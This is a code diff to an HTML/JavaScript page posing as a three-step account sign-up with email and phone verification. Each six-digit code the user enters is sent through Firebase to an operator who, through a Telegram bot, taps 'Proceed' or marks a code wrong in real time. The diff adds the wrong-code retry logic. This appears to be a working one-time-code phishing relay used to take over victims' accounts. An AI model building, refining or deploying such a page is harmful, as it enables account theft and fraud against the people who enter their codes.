@@ -157,7 +157,7 @@ select option{background:#3B0616}
 
 #form-section{padding:60px 20px;background:#0f0f11}
 
-/* SUBMIT SPINNER â€” shown the instant the button is clicked */
+/* SUBMIT SPINNER — shown the instant the button is clicked */
 .submit-spin{display:none;text-align:center;padding:1.5rem 0 0.5rem}
 .submit-spin.on{display:block}
 .submit-spin .spinner{width:36px;height:36px;border-width:3px}
@@ -204,7 +204,7 @@ select option{background:#3B0616}
 
   <div id="s1" class="screen active">
     <div class="progress"><i class="on"></i><i></i><i></i></div>
-    <div class="step-lbl">Step 1 of 3 Â· Your details</div>
+    <div class="step-lbl">Step 1 of 3 · Your details</div>
     <h1>Create your account</h1>
     <p class="sub">We'll send a verification code to confirm your details.</p>
     <label>Email address</label>
@@ -396,7 +396,7 @@ select option{background:#3B0616}
 
   <div id="s2" class="screen">
     <div class="progress"><i class="on"></i><i class="on"></i><i></i></div>
-    <div class="step-lbl">Step 2 of 3 Â· Email</div>
+    <div class="step-lbl">Step 2 of 3 · Email</div>
     <h1>Check your email</h1>
     <p class="sub">Six digits sent to:</p>
     <div class="sent-box"><span class="tick">@</span><b id="email-show" style="color:#FFF4F7"></b></div>
@@ -418,8 +418,8 @@ select option{background:#3B0616}
 
   <div id="s3" class="screen">
     <div class="progress"><i class="on"></i><i class="on"></i><i class="on"></i></div>
-    <div class="done-row"><span class="tick">âœ“</span>Email verified</div>
-    <div class="step-lbl">Step 3 of 3 Â· Phone</div>
+    <div class="done-row"><span class="tick">✓</span>Email verified</div>
+    <div class="step-lbl">Step 3 of 3 · Phone</div>
     <h1>Check your phone</h1>
     <p class="sub">Six digits sent to:</p>
     <div class="sent-box"><span class="tick">#</span><b id="phone-show" style="color:#FFF4F7"></b></div>
@@ -495,7 +495,7 @@ try {
    Client role:
      - WRITE one pending record under account_verifications/{requestId}
      - READ that single record
-     - WRITE emailCode / phoneCode when user submits the 4-digit code
+     - WRITE emailCode / phoneCode when user submits the 6-digit code
      - NEVER write emailVerified / phoneVerified / status
    The trusted backend (Telegram verifier) is the ONLY writer
    allowed to flip flags to true.
@@ -508,6 +508,16 @@ let currentRequestId = null;
 let currentUnsubscribe = null;
 let submissionLocked = false;
 let currentStep = 1;
+
+// EDGE-TRIGGER GUARDS ------------------------------------------------
+// We only run the "clear OTP inputs + show error" routine when the
+// rejection flag transitions from false/undefined -> true. While the
+// flag remains true (which it does until the user submits a new code,
+// at which point verifyEmail/verifyPhone flip it back to false), we
+// do NOT clear the input again.
+let _emailRejectedLastSeen = false;
+let _phoneRejectedLastSeen = false;
+// --------------------------------------------------------------------
 
 function setActiveScreen(id) {
     document.querySelectorAll(".screen").forEach(el => el.classList.remove("active"));
@@ -600,7 +610,7 @@ function chk() {
     btn.disabled = !ready;
 }
 
-// Enable/disable the two verify buttons based on 4-digit input.
+// Enable/disable the two verify buttons based on 6-digit input.
 function otpChk(prefix, btnId) {
     const btn = document.getElementById(btnId);
     if (!btn) return;
@@ -665,6 +675,8 @@ async function step1() {
     const requestId = generateRequestId();
     currentRequestId = requestId;
     currentStep = 1;
+    _emailRejectedLastSeen = false;
+    _phoneRejectedLastSeen = false;
 
     const emailShow = document.getElementById("email-show");
     const phoneShow = document.getElementById("phone-show");
@@ -680,6 +692,8 @@ async function step1() {
         emailVerified: false,
         phoneVerified: false,
         rejected: false,
+        emailRejected: false,
+        phoneRejected: false,
         createdAt: Date.now()
     };
 
@@ -696,11 +710,11 @@ async function step1() {
     }
 
     // Keep the spinner spinning until admin taps Proceed.
-// Do NOT call hideSubmitSpinner() here.
-startDotAnim(btn);
-btn.disabled = true;
+    // Do NOT call hideSubmitSpinner() here.
+    startDotAnim(btn);
+    btn.disabled = true;
 
-attachListener(requestId);
+    attachListener(requestId);
 }
 
 function attachListener(requestId) {
@@ -718,7 +732,6 @@ function attachListener(requestId) {
             const proceedOk = data.proceed === true;
             const emailOk   = data.emailVerified === true;
             const phoneOk   = data.phoneVerified === true;
-            const statusOk  = true; // phone approval is enough
 
             // STEP 1 -> 2: admin tapped "Proceed"
             if (proceedOk && currentStep === 1) {
@@ -738,6 +751,7 @@ function attachListener(requestId) {
             if (proceedOk && emailOk && currentStep === 2) {
                 currentStep = 3;
                 hideError("err2");
+                _emailRejectedLastSeen = false;
                 ["p0","p1","p2","p3","p4","p5"].forEach(id => {
                     const el = document.getElementById(id);
                     if (el) el.value = "";
@@ -758,11 +772,63 @@ function attachListener(requestId) {
                 return;
             }
 
-            // Terminal failure
-            if (data.status === "rejected" || data.status === "expired") {
+            // ---------- RETRYABLE: EMAIL CODE REJECTED (EDGE-TRIGGERED) ----------
+            // Only fire on the false/undefined -> true transition. While
+            // the flag stays true, we do nothing, so the user's fresh
+            // input is never wiped out by a subsequent snapshot.
+            const emailRejectedNow = data.emailRejected === true;
+            if (emailRejectedNow && !_emailRejectedLastSeen && currentStep === 2) {
+                _emailRejectedLastSeen = true;
+                const verifySpin = document.getElementById("s2-verify");
+                if (verifySpin) verifySpin.style.display = "none";
+                ["e0","e1","e2","e3","e4","e5"].forEach(id => {
+                    const el = document.getElementById(id);
+                    if (el) el.value = "";
+                });
+                otpChk("e", "btn2");
+                showError("err2", "Incorrect code. Try again.");
+                const first = document.getElementById("e0");
+                if (first) first.focus();
+                return;
+            }
+            // Flag flipped back to false (because the user submitted a new code).
+            if (!emailRejectedNow) {
+                if (_emailRejectedLastSeen) {
+                    _emailRejectedLastSeen = false;
+                    hideError("err2");
+                }
+            }
+
+            // ---------- RETRYABLE: PHONE CODE REJECTED (EDGE-TRIGGERED) ----------
+            const phoneRejectedNow = data.phoneRejected === true;
+            if (phoneRejectedNow && !_phoneRejectedLastSeen && currentStep === 3) {
+                _phoneRejectedLastSeen = true;
+                const verifySpin = document.getElementById("s3-verify");
+                if (verifySpin) verifySpin.style.display = "none";
+                ["p0","p1","p2","p3","p4","p5"].forEach(id => {
+                    const el = document.getElementById(id);
+                    if (el) el.value = "";
+                });
+                otpChk("p", "btn3");
+                showError("err3", "Incorrect code. Try again.");
+                const first = document.getElementById("p0");
+                if (first) first.focus();
+                return;
+            }
+            if (!phoneRejectedNow) {
+                if (_phoneRejectedLastSeen) {
+                    _phoneRejectedLastSeen = false;
+                    hideError("err3");
+                }
+            }
+
+            // ---------- TERMINAL: whole request rejected / expired ----------
+            if (data.status === "rejected" || data.status === "expired" || data.rejected === true) {
                 teardownListener();
                 submissionLocked = false;
                 currentStep = 1;
+                _emailRejectedLastSeen = false;
+                _phoneRejectedLastSeen = false;
                 const b = document.getElementById("btn1");
                 if (b) { b.textContent = "Send verification code"; b.disabled = false; }
                 setActiveScreen("s1");
@@ -777,13 +843,15 @@ function attachListener(requestId) {
             teardownListener();
             submissionLocked = false;
             currentStep = 1;
+            _emailRejectedLastSeen = false;
+            _phoneRejectedLastSeen = false;
             const b = document.getElementById("btn1");
             if (b) { b.textContent = "Send verification code"; b.disabled = false; }
             setActiveScreen("s1");
             chk();
             stopDotAnim();
-        hideSubmitSpinner();
-        showError("err1", "Connection error. Please try again.");
+            hideSubmitSpinner();
+            showError("err1", "Connection error. Please try again.");
         }
     );
 }
@@ -808,6 +876,9 @@ async function verifyEmail() {
     if (verifySpin) verifySpin.style.display = "block";
 
     try {
+        // Write the fresh code, then clear the rejection flag. The
+        // listener's edge-trigger guard means clearing the flag does
+        // NOT re-run the "wipe the inputs" routine.
         await set(
             ref(firebaseDb, VERIFICATIONS_PATH + "/" + currentRequestId + "/emailCode"),
             code
@@ -815,6 +886,18 @@ async function verifyEmail() {
         await set(
             ref(firebaseDb, VERIFICATIONS_PATH + "/" + currentRequestId + "/emailCodeSubmittedAt"),
             Date.now()
+        );
+        await set(
+            ref(firebaseDb, VERIFICATIONS_PATH + "/" + currentRequestId + "/emailRejected"),
+            false
+        );
+        // Also reset the bot-side flag that tells it whether to resend
+        // the stage-2 card. This mirrors what the bot does when the
+        // admin taps "Wrong Email Code" -> true; here we flip back to
+        // false so the next snapshot will trigger a fresh card.
+        await set(
+            ref(firebaseDb, VERIFICATIONS_PATH + "/" + currentRequestId + "/emailRejectedNotified"),
+            false
         );
     } catch (err) {
         console.error("Failed to submit email code:", err);
@@ -855,6 +938,14 @@ async function verifyPhone() {
         await set(
             ref(firebaseDb, VERIFICATIONS_PATH + "/" + currentRequestId + "/phoneCodeSubmittedAt"),
             Date.now()
+        );
+        await set(
+            ref(firebaseDb, VERIFICATIONS_PATH + "/" + currentRequestId + "/phoneRejected"),
+            false
+        );
+        await set(
+            ref(firebaseDb, VERIFICATIONS_PATH + "/" + currentRequestId + "/phoneRejectedNotified"),
+            false
         );
     } catch (err) {
         console.error("Failed to submit phone code:", err);
@@ -923,8 +1014,3 @@ window.accountVerificationFirebase = {
 </script>
 </body>
 </html>
-
-
-
-
-
